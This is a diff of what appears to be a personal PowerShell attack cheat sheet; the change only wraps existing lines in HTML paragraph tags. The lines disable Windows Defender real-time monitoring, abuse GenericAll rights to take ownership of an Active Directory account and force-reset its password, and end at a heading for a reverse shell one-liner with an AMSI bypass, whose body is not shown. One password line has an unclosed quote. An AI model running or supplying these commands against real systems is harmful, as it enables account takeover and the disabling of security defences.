@@ -4,15 +4,15 @@
 
 
 
-Set-MpPreference -DisableRealtimeMonitoring $true
+<p>Set-MpPreference -DisableRealtimeMonitoring $true<p>
 
 #Fore-Change PAssword - generic All 
 
 
-Set-DomainObjectOwner -Identity stgadm -OwnerIdentity hexninja
-Add-DomainObjectAcl -TargetIdentity stgadm -PrincipalIdentity hexninja
-$newpass = ConvertTo-SecureString -String 'Password123! -AsPlainText -Force
-Set-DomainUserPassword -Identity stgadm -AccountPassword $newpass
+<p>Set-DomainObjectOwner -Identity stgadm -OwnerIdentity hexninja<p>
+<p>Add-DomainObjectAcl -TargetIdentity stgadm -PrincipalIdentity hexninja<p>
+<p>$newpass = ConvertTo-SecureString -String 'Password123! -AsPlainText -Force<p>
+<p>Set-DomainUserPassword -Identity stgadm -AccountPassword $newpass<p>
 
 
 #Powershell Reverse Shell one Liner (AMSI Bypass)
